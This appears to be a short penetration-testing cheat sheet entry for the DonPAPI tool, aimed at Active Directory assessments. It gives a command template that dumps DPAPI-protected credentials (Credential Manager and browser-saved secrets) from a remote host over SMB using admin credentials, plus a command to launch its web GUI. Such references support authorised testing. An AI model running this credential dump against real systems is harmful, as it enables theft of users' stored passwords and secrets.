# donpapi

% donpapi

## Dump DPAPI
#assessment/AD #attack_type/Dump #port/139 #port/445 #protocol/smb #access/Admin

Dump the DPAPI credentials from target host. Retrieves all secrets from Credential Manager, Chrome, Edge, Firefox.

⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)

```bash
donpapi collect "<domain>"/"<user>":"<password>"@<ip>

```

## DonPAPI web GUI
#assessment/AD #attack_type/Dump #port/139 #port/445 #protocol/smb #access/Admin

Launch DonPAPI web GUI

```bash
donpapi gui
```

= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
